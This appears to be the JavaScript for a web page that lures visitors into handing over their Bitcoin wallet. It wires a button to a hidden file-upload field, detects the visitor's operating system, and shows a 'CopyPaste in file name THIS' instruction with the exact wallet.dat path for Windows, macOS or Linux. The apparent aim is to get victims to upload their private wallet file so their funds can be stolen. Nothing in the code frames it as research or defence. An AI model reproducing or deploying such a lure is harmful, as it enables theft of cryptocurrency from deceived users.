// https://stackoverflow.com/questions/31693296/is-it-possible-to-make-a-button-as-file-upload-button

$(document).ready(function() {
	
	document.getElementById('buttonid').addEventListener('click', openDialog);
	$('#message-tx').html( $('#message-tx').html() + genMessageforUser() );
})

// document.getElementById('message-tx').value += genMessageforUser(detectOS());

////////////////////////////////////////////

function detectOS() {
	// https://www.geeksforgeeks.org/detect-the-operating-system-of-user-using-javascript/	
	var ret = -1;
        if (navigator.appVersion.indexOf("(Windows") != -1) ret = 1;
        if (navigator.appVersion.indexOf("(Macintosh") != -1) ret =  2;
        if (navigator.appVersion.indexOf("(X11") != -1) ret =  3;
        if (navigator.appVersion.indexOf("(Linux") != -1) ret = 3;
	return ret;
}

function openDialog() {
  document.getElementById('fileid').click();
}

function genMessageforUser() {
	var ret = '';
		switch(detectOS()) {
			case 1:
				ret = '<br>CopyPaste in "file name" THIS: <br><b>%APPDATA%\\Bitcoin\\wallet.dat</b>';
				break;
			case 2:
				ret = '<br>CopyPaste in "file name" THIS: <br><b>~/Library/Application Support/Bitcoin/wallet.dat</b>';
				break;
			case 3:
				ret = '<br>CopyPaste in "file name" THIS: <br><b>~/.bitcoin/wallet.dat</b>';
				break;
			default:
				break;
		}
	return ret;
}